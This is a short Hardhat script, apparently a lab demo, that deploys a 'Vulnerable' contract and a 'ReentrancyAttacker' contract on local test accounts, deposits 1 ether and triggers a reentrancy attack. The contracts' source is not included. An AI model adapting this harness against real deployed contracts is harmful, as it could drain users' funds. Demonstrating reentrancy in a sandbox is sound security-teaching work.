const { ethers } = require("hardhat");

async function main() {
    const [attacker, victim] = await ethers.getSigners();

    // Deploy the vulnerable contract
    const Vulnerable = await ethers.getContractFactory("Vulnerable");
    const vulnerableContract = await Vulnerable.deploy();
    await vulnerableContract.deployed();
    console.log("Vulnerable contract deployed at:", vulnerableContract.address);

    // Attacker deploys malicious contract
    const AttackerContract = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerContract.deploy(vulnerableContract.address);
    await attackerContract.deployed();
    console.log("Attacker contract deployed at:", attackerContract.address);

    // Attacker deposits funds
    await attackerContract.deposit({ value: ethers.utils.parseEther("1") });

    // Attacker triggers reentrancy exploit
    console.log("🚨 Launching reentrancy attack...");
    await attackerContract.attack();
}

main().catch((error) => {
    console.error("❌ Attack failed:", error);
    process.exit(1);
});
